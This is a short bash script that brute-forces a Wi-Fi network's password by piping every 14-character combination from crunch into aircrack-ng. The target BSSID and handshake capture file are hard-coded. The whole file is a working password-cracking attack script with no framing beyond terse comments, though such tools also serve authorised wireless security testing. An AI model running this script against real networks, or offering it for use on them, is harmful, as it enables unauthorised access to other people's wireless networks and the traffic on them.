#!/bin/bash

# Set the minimum and maximum password length and character set
min_length=14
max_length=14
charset="0123456789abcdefghijklmnopqrstuvwxyz!@#$%^&*()-_=+"

# Define the BSSID (replace with the target Wi-Fi network's BSSID)
bssid="3C:7C:3F:93:01:10"

# Define the capture file (replace with the actual capture file)
capture_file="mywifi-03.cap"

# Loop to generate and test passwords
for ((length = min_length; length <= max_length; length++)); do
    echo "Generating and testing passwords of length $length..."
    crunch $length $length $charset | aircrack-ng -w - -b $bssid $capture_file
done
